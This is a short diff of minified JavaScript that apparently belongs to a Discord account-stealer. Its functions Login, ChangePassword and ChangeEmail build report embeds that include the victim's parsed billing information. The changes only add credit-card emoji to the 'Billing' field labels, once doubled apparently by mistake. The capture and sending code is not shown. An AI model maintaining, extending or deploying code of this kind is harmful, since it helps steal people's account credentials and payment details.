@@ -329,7 +329,7 @@ function Login(e, t, n) {
                             inline: !1,
                           },
                           {
-                            name: "Billing",
+                            name: "<:creditcard:966803519627743273> <:creditcard:966803519627743273> Billing",
                             value: `${(function () {
                               const e = JSON.parse(s);
                               var t = "";
@@ -446,7 +446,7 @@ function ChangePassword(e, t, n) {
                         inline: !1,
                       },
                       {
-                        name: "Billing",
+                        name: "<:creditcard:966803519627743273> Billing",
                         value: `${(function () {
                           const e = JSON.parse(a);
                           var t = "";
@@ -536,7 +536,7 @@ function ChangeEmail(e, t, n) {
                         inline: !1,
                       },
                       {
-                        name: "Billing",
+                        name: "<:creditcard:966803519627743273> Billing",
                         value: `${(function () {
                           const e = JSON.parse(a);
                           var t = "";
